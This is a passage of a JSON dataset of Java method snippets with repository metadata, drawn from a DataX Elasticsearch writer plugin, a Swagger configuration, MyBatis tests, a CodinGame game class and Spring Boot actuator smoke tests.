\u540e\u9762\u65f6\u95f4\u4f1a\u5904\u7406\u4e3a\u5e26\u65f6\u533a\u7684\u6807\u51c6\u65f6\u95f4,\u6240\u4ee5\u4e0d\u9700\u8981\u7ed9ES\u6307\u5b9a\u683c\u5f0f                            /*                            if (jo.getString(\"format\") != null) {                                field.put(\"format\", jo.getString(\"format\"));                            } else {                                //field.put(\"format\", \"strict_date_optional_time||epoch_millis||yyyy-MM-dd HH:mm:ss||yyyy-MM-dd\");                            }                            */                            break;                        case GEO_SHAPE:                            field.put(\"tree\", jo.getString(\"tree\"));                            field.put(\"precision\", jo.getString(\"precision\"));                        default:                            break;                    }                    propMap.put(colName, field);                    columnList.add(columnItem);                }            }            conf.set(WRITE_COLUMNS, JSON.toJSONString(columnList));            log.info(JSON.toJSONString(columnList));            Map<String, Object> rootMappings = new HashMap<String, Object>();            Map<String, Object> typeMappings = new HashMap<String, Object>();            typeMappings.put(\"properties\", propMap);            rootMappings.put(typeName, typeMappings);            mappings = JSON.toJSONString(rootMappings);            if (mappings == null || \"\".equals(mappings)) {                throw DataXException.asDataXException(ESWriterErrorCode.BAD_CONFIG_VALUE, \"must have mappings\");            }            return mappings;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Job", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "split", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "List<Configuration>", "snippet": "        public List<Configuration> split(int mandatoryNumber) {            List<Configuration> configurations = new ArrayList<Configuration>(mandatoryNumber);            for (int i = 0; i < mandatoryNumber; i++) {                configurations.add(conf);            }            return configurations;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Job", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "post", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void post() {            ESClient esClient = new ESClient();            esClient.createClient(Key.getEndpoint(conf),                    Key.getAccessID(conf),                    Key.getAccessKey(conf),                    false,                    300000,                    false,                    false);            String alias = Key.getAlias(conf);            if (!\"\".equals(alias)) {                log.info(String.format(\"alias [%s] to [%s]\", alias, Key.getIndexName(conf)));                try {                    esClient.alias(Key.getIndexName(conf), alias, Key.isNeedCleanAlias(conf));                } catch (IOException e) {                    throw DataXException.asDataXException(ESWriterErrorCode.ES_ALIAS_MODIFY, e);                }            }        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Job", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "destroy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void destroy() {        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Job", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void init() {            this.conf = super.getPluginJobConf();            index = Key.getIndexName(conf);            type = Key.getTypeName(conf);            trySize = Key.getTrySize(conf);            batchSize = Key.getBatchSize(conf);            splitter = Key.getSplitter(conf);            columnList = JSON.parseObject(this.conf.getString(WRITE_COLUMNS), new TypeReference<List<ESColumn>>() {            });            typeList = new ArrayList<ESFieldType>();            for (ESColumn col : columnList) {                typeList.add(ESFieldType.getESFieldType(col.getType()));            }            esClient = new ESClient();        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Task", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "prepare", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void prepare() {            esClient.createClient(Key.getEndpoint(conf),                    Key.getAccessID(conf),                    Key.getAccessKey(conf),                    Key.isMultiThread(conf),                    Key.getTimeout(conf),                    Key.isCompression(conf),                    Key.isDiscovery(conf));        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Task", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "startWrite", "params": ["RecordReceiver"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void startWrite(RecordReceiver recordReceiver) {            List<Record> writerBuffer = new ArrayList<Record>(this.batchSize);            Record record = null;            long total = 0;            while ((record = recordReceiver.getFromReader()) != null) {                writerBuffer.add(record);                if (writerBuffer.size() >= this.batchSize) {                    total += doBatchInsert(writerBuffer);                    writerBuffer.clear();                }            }            if (!writerBuffer.isEmpty()) {                total += doBatchInsert(writerBuffer);                writerBuffer.clear();            }            String msg = String.format(\"task end, write size :%d\", total);            getTaskPluginCollector().collectMessage(\"writesize\", String.valueOf(total));            log.info(msg);            esClient.closeJestClient();        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Task", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getDateStr", "params": ["ESColumn", "Column"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "        private String getDateStr(ESColumn esColumn, Column column) {            DateTime date = null;            DateTimeZone dtz = DateTimeZone.getDefault();            if (esColumn.getTimezone() != null) {                // \u6240\u6709\u65f6\u533a\u53c2\u8003 http://www.joda.org/joda-time/timezones.html                dtz = DateTimeZone.forID(esColumn.getTimezone());            }            if (column.getType() != Column.Type.DATE && esColumn.getFormat() != null) {                DateTimeFormatter formatter = DateTimeFormat.forPattern(esColumn.getFormat());                date = formatter.withZone(dtz).parseDateTime(column.asString());                return date.toString();            } else if (column.getType() == Column.Type.DATE) {                date = new DateTime(column.asLong(), dtz);                return date.toString();            } else {                return column.asString();            }        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Task", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "doBatchInsert", "params": ["List<Record>"], "throws": null, "modifiers": ["private"], "return_type": "long", "snippet": "        private long doBatchInsert(final List<Record> writerBuffer) {            Map<String, Object> data = null;            final Bulk.Builder bulkaction = new Bulk.Builder().defaultIndex(this.index).defaultType(this.type);            for (Record record : writerBuffer) {                data = new HashMap<String, Object>();                String id = null;                for (int i = 0; i < record.getColumnNumber(); i++) {                    Column column = record.getColumn(i);                    String columnName = columnList.get(i).getName();                    ESFieldType columnType = typeList.get(i);                    //\u5982\u679c\u662f\u6570\u7ec4\u7c7b\u578b\uff0c\u90a3\u5b83\u4f20\u5165\u7684\u5fc5\u662f\u5b57\u7b26\u4e32\u7c7b\u578b                    if (columnList.get(i).isArray() != null && columnList.get(i).isArray()) {                        String[] dataList = column.asString().split(splitter);                        if (!columnType.equals(ESFieldType.DATE)) {                            data.put(columnName, dataList);                        } else {                            for (int pos = 0; pos < dataList.length; pos++) {                                dataList[pos] = getDateStr(columnList.get(i), column);                            }                            data.put(columnName, dataList);                        }                    } else {                        switch (columnType) {                            case ID:                                if (id != null) {                                    id += record.getColumn(i).asString();                                } else {                                    id = record.getColumn(i).asString();                                }                                break;                            case DATE:                                try {                                    String dateStr = getDateStr(columnList.get(i), column);                                    data.put(columnName, dateStr);                                } catch (Exception e) {                                    getTaskPluginCollector().collectDirtyRecord(record, String.format(\"\u65f6\u95f4\u7c7b\u578b\u89e3\u6790\u5931\u8d25 [%s:%s] exception: %s\", columnName, column.toString(), e.toString()));                                }                                break;                            case KEYWORD:                            case STRING:                            case TEXT:                            case IP:                            case GEO_POINT:                                data.put(columnName, column.asString());                                break;                            case BOOLEAN:                                data.put(columnName, column.asBoolean());                                break;                            case BYTE:                            case BINARY:                                data.put(columnName, column.asBytes());                                break;                            case LONG:                                data.put(columnName, column.asLong());                                break;                            case INTEGER:                                data.put(columnName, column.asBigInteger());                                break;                            case SHORT:                                data.put(columnName, column.asBigInteger());                                break;                            case FLOAT:                            case DOUBLE:                                data.put(columnName, column.asDouble());                                break;                            case NESTED:                            case OBJECT:                            case GEO_SHAPE:                                data.put(columnName, JSON.parse(column.asString()));                                break;                            default:                                getTaskPluginCollector().collectDirtyRecord(record, \"\u7c7b\u578b\u9519\u8bef:\u4e0d\u652f\u6301\u7684\u7c7b\u578b:\" + columnType + \" \" + columnName);                        }                    }                }                if (id == null) {                    //id = UUID.randomUUID().toString();                    bulkaction.addAction(new Index.Builder(data).build());                } else {                    bulkaction.addAction(new Index.Builder(data).id(id).build());                }            }            try {                return RetryUtil.executeWithRetry(new Callable<Integer>() {                    @Override                    public Integer call() throws Exception {                        JestResult jestResult = esClient.bulkInsert(bulkaction, 1);                        if (jestResult.isSucceeded()) {                            return writerBuffer.size();                        }                        String msg = String.format(\"response code: [%d] error :[%s]\", jestResult.getResponseCode(), jestResult.getErrorMessage());                        log.warn(msg);                        if (esClient.isBulkResult(jestResult)) {                            BulkResult brst = (BulkResult) jestResult;                            List<BulkResult.BulkResultItem> failedItems = brst.getFailedItems();                            for (BulkResult.BulkResultItem item : failedItems) {                                if (item.status != 400) {                                    // 400 BAD_REQUEST  \u5982\u679c\u975e\u6570\u636e\u5f02\u5e38,\u8bf7\u6c42\u5f02\u5e38,\u5219\u4e0d\u5141\u8bb8\u5ffd\u7565                                    throw DataXException.asDataXException(ESWriterErrorCode.ES_INDEX_INSERT, String.format(\"status:[%d], error: %s\", item.status, item.error));                                } else {                                    // \u5982\u679c\u7528\u6237\u9009\u62e9\u4e0d\u5ffd\u7565\u89e3\u6790\u9519\u8bef,\u5219\u629b\u5f02\u5e38,\u9ed8\u8ba4\u4e3a\u5ffd\u7565                                    if (!Key.isIgnoreParseError(conf)) {                                        throw DataXException.asDataXException(ESWriterErrorCode.ES_INDEX_INSERT, String.format(\"status:[%d], error: %s, config not ignoreParseError so throw this error\", item.status, item.error));                                    }                                }                            }                            List<BulkResult.BulkResultItem> items = brst.getItems();                            for (int idx = 0; idx < items.size(); ++idx) {                                BulkResult.BulkResultItem item = items.get(idx);                                if (item.error != null && !\"\".equals(item.error)) {                                    getTaskPluginCollector().collectDirtyRecord(writerBuffer.get(idx), String.format(\"status:[%d], error: %s\", item.status, item.error));                                }                            }                            return writerBuffer.size() - brst.getFailedItems().size();                        } else {                            Integer status = esClient.getStatus(jestResult);                            switch (status) {                                case 429: //TOO_MANY_REQUESTS                                    log.warn(\"server response too many requests, so auto reduce speed\");                                    break;                            }                            throw DataXException.asDataXException(ESWriterErrorCode.ES_INDEX_INSERT, jestResult.getErrorMessage());                        }                    }                }, trySize, 60000L, true);            } catch (Exception e) {                if (Key.isIgnoreWriteError(this.conf)) {                    log.warn(String.format(\"\u91cd\u8bd5[%d]\u6b21\u5199\u5165\u5931\u8d25\uff0c\u5ffd\u7565\u8be5\u9519\u8bef\uff0c\u7ee7\u7eed\u5199\u5165!\", trySize));                } else {                    throw DataXException.asDataXException(ESWriterErrorCode.ES_INDEX_INSERT, e);                }            }            return 0;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Task", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "post", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void post() {        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Task", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "destroy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void destroy() {            esClient.closeJestClient();        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Task", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "createRestApi", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Docket", "snippet": "    public Docket createRestApi(){        return new Docket(DocumentationType.SWAGGER_2)                .apiInfo(apiInfo())                .select()                //\u4e3a\u5f53\u524d\u5305\u4e0bcontroller\u751f\u6210API\u6587\u6863                .apis(RequestHandlerSelectors.basePackage(\"com.macro.mall.tiny.controller\"))                //\u4e3a\u6709@Api\u6ce8\u89e3\u7684Controller\u751f\u6210API\u6587\u6863//                .apis(RequestHandlerSelectors.withClassAnnotation(Api.class))                //\u4e3a\u6709@ApiOperation\u6ce8\u89e3\u7684\u65b9\u6cd5\u751f\u6210API\u6587\u6863//                .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class))                .paths(PathSelectors.any())                .build();    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/config/Swagger2Config.java", "stars": "2", "class": {"name": "Swagger2Config", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "apiInfo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "ApiInfo", "snippet": "    private ApiInfo apiInfo() {        return new ApiInfoBuilder()                .title(\"SwaggerUI\u6f14\u793a\")                .description(\"mall-tiny\")                .contact(\"macro\")                .version(\"1.0\")                .build();    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/config/Swagger2Config.java", "stars": "2", "class": {"name": "Swagger2Config", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {    // create an SqlSessionFactory    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/array_result_type/mybatis-config.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    // populate in-memory database    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),            \"org/apache/ibatis/submitted/array_result_type/CreateDB.sql\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/array_result_type/ArrayResultTypeTest.java", "stars": "15", "class": {"name": "ArrayResultTypeTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldGetUserArray", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetUserArray() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      User[] users = mapper.getUsers();      assertEquals(\"User1\", users[0].getName());      assertEquals(\"User2\", users[1].getName());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/array_result_type/ArrayResultTypeTest.java", "stars": "15", "class": {"name": "ArrayResultTypeTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldGetUserArrayXml", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetUserArrayXml() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      User[] users = mapper.getUsersXml();      assertEquals(\"User1\", users[0].getName());      assertEquals(\"User2\", users[1].getName());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/array_result_type/ArrayResultTypeTest.java", "stars": "15", "class": {"name": "ArrayResultTypeTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldGetSimpleTypeArray", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetSimpleTypeArray() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      Integer[] ids = mapper.getUserIds();      assertEquals(Integer.valueOf(1), ids[0]);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/array_result_type/ArrayResultTypeTest.java", "stars": "15", "class": {"name": "ArrayResultTypeTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldGetPrimitiveArray", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetPrimitiveArray() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      int[] ids = mapper.getUserIdsPrimitive();      assertEquals(1, ids[0]);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/array_result_type/ArrayResultTypeTest.java", "stars": "15", "class": {"name": "ArrayResultTypeTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getTarget", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Coord", "snippet": "    public Coord getTarget() {        return destination;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/action/MoveAction.java", "stars": "15", "class": {"name": "MoveAction", "extends": null, "implements": ["Action"], "modifiers": ["public"]}}, {"method_name": "getType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "PacmanType", "snippet": "    public PacmanType getType() {        return null;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/action/MoveAction.java", "stars": "15", "class": {"name": "MoveAction", "extends": null, "implements": ["Action"], "modifiers": ["public"]}}, {"method_name": "getActionType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ActionType", "snippet": "    public ActionType getActionType() {        return ActionType.MOVE;    }", "url": "https://raw.githubusercontent.com/CodinGame/SpringChallenge2020/master/src/main/java/com/codingame/spring2020/action/MoveAction.java", "stars": "15", "class": {"name": "MoveAction", "extends": null, "implements": ["Action"], "modifiers": ["public"]}}, {"method_name": "testHomeIsSecure", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testHomeIsSecure() {\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(this.restTemplate.getForEntity(\"/\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);\t\tassertThat(entity.getBody().get(\"error\")).isEqualTo(\"Unauthorized\");\t\tassertThat(entity.getHeaders()).doesNotContainKey(\"Set-Cookie\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testMetricsIsSecure", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testMetricsIsSecure() {\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\t\t\t\tthis.restTemplate.getForEntity(\"/actuator/metrics\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);\t\tentity = asMapEntity(this.restTemplate.getForEntity(\"/actuator/metrics/\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);\t\tentity = asMapEntity(this.restTemplate.getForEntity(\"/actuator/metrics/foo\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);\t\tentity = asMapEntity(this.restTemplate.getForEntity(\"/actuator/metrics.json\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testHome", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testHome() {\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\t\tassertThat(entity.getBody().get(\"message\")).isEqualTo(\"Hello Phil\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testMetrics", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testMetrics() {\t\ttestHome(); // makes sure some requests have been made\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/actuator/metrics\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\t\tassertThat(entity.getBody()).containsKey(\"names\");\t\tList<String> names = (List<String>) entity.getBody().get(\"names\");\t\tassertThat(names).contains(\"jvm.buffer.count\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testEnv", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testEnv() {\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/actuator/env\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\t\tassertThat(entity.getBody()).containsKey(\"propertySources\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "healthInsecureByDefault", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid healthInsecureByDefault() {\t\tResponseEntity<String> entity = this.restTemplate.getForEntity(\"/actuator/health\", String.class);\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\t\tassertThat(entity.getBody()).contains(\"\\\"status\\\":\\\"UP\\\"\");\t\tassertThat(entity.getBody()).doesNotContain(\"\\\"hello\\\":\\\"1\\\"\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "infoInsecureByDefault", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid infoInsecureByDefault() {\t\tResponseEntity<String> entity = this.restTemplate.getForEntity(\"/actuator/info\", String.class);\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\t\tassertThat(entity.getBody()).contains(\"\\\"artifact\\\":\\\"spring-boot-smoke-test-actuator\\\"\");\t\tassertThat(entity.getBody()).contains(\"\\\"someKey\\\":\\\"someValue\\\"\");\t\tassertThat(entity.getBody()).contains(\"\\\"java\\\":{\", \"\\\"source\\\":\\\"1.8\\\"\", \"\\\"target\\\":\\\"1.8\\\"\");\t\tassertThat(entity.getBody()).contains(\"\\\"encoding\\\":{\", \"\\\"source\\\":\\\"UTF-8\\\"\", \"\\\"reporting\\\":\\\"UTF-8\\\"\");\t}\t@Test\tvoid testErrorPage() {\t\tResponseEntity<String> entity = this.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/foo\",\t\t\t\tString.class);\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.INTERNAL_SERVER_ERROR);\t\tString body = entity.getBody();\t\tassertThat(body).contains(\"\\\"error\\\":\");\t}\t@Test\tvoid testHtmlErrorPage() {\t\tHttpHeaders headers = new HttpHeaders();\t\theaders.setAccept(Arrays.asList(MediaType.TEXT_HTML));\t\tHttpEntity<?> request = new HttpEntity<Void>(headers);\t\tResponseEntity<String> entity = this.restTemplate.withBasicAuth(\"user\", \"password\").exchange(\"/foo\",\t\t\t\tHttpMethod.GET, request, String.class);\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.INTERNAL_SERVER_ERROR);\t\tString body = entity.getBody();\t\tassertThat(body).as(\"Body was null\").isNotNull();\t\tassertThat(body).contains(\"This application has no explicit mapping for /error\");\t}\t@Test\tvoid testErrorPageDirectAccess() {\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/error\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.INTERNAL_SERVER_ERROR);\t\tassertThat(entity.getBody().get(\"error\")).isEqualTo(\"None\");\t\tassertThat(entity.getBody().get(\"status\")).isEqualTo(999);\t}\t@Test\tvoid testBeans() {\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/actuator/beans\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\t\tassertThat(entity.getBody()).containsOnlyKeys(\"contexts\");\t}\t@Test\t@SuppressWarnings(\"unchecked\")\tvoid testConfigProps() {\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/actuator/configprops\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\t\tMap<String, Object> body = entity.getBody();\t\tMap<String, Object> contexts = (Map<String, Object>) body.get(\"contexts\");\t\tMap<String, Object> context = (Map<String, Object>) contexts.get(this.applicationContext.getId());\t\tMap<String, Object> beans = (Map<String, Object>) context.get(\"beans\");\t\tassertThat(beans).containsKey(\"spring.datasource-\" + DataSourceProperties.class.getName());\t}\t@Test\tvoid testLegacy() {\t\tResponseEntity<Map<String, Object>> entity = asMapEntity(\t\t\t\tthis.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/actuator/legacy\", Map.class));\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\t\tassertThat(entity.getBody()).contains(entry(\"legacy\", \"legacy\"));\t}\t@SuppressWarnings({ \"unchecked\", \"rawtypes\" })\tstatic <K, V> ResponseEntity<Map<K, V>> asMapEntity(ResponseEntity<Map> entity) {\t\treturn (ResponseEntity) entity;\t}}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testErrorPage", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testErrorPage() {\t\tResponseEntity<String> entity = this.restTemplate.withBasicAuth(\"user\", \"password\").getForEntity(\"/foo\",\t\t\t\tString.class);\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.INTERNAL_SERVER_ERROR);\t\tString body = entity.getBody();\t\tassertThat(body).contains(\"\\\"error\\\":\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/SampleActuatorApplicationTests.java", "stars": "47572", "class": {"name": "SampleActuatorApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testHtmlErrorPage", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testHtmlErrorPage() {\t\tHttpHeaders headers = new HttpHeaders();\t\theaders.setAccept(Arrays.asList(MediaType.TEXT_HTML));\t\tHttpEntity<?> request = new HttpEntity<Void>(headers);\t\tResponseEntity<String> entity = this.restTemplate.withBasicAuth(\"user\", \"password\").exchange(\"/foo\",\t\t\t\tHttpMethod.GET, request, String.class);\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.INTERNAL_SERVER_ERROR);\t\tString body = entity.getBody();\t\tassertThat(body).as(\"Body was null\").isNotNull();\t\tassertThat(body).contains(\"This application has no explicit mapping for /error\");\t}", "url": 